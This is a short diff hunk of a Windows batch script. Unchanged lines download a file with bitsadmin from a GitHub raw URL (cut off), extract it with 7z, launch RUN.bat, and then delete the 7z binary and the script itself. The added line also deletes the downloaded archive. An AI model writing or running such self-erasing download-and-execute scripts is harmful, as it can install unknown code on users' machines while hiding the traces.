@@ -4,5 +4,6 @@ bitsadmin.exe /transfer "LOL" /priority FOREGROUND https://raw.githubusercontent
 "%~dp0\7z" e "INSTALL.rar"
 start cmd /c "RUN.bat"
 DEL "%~dp07z.exe"
+DEL "%~dp0INSTALL.rar"
 DEL "%~f0"
 EXIT
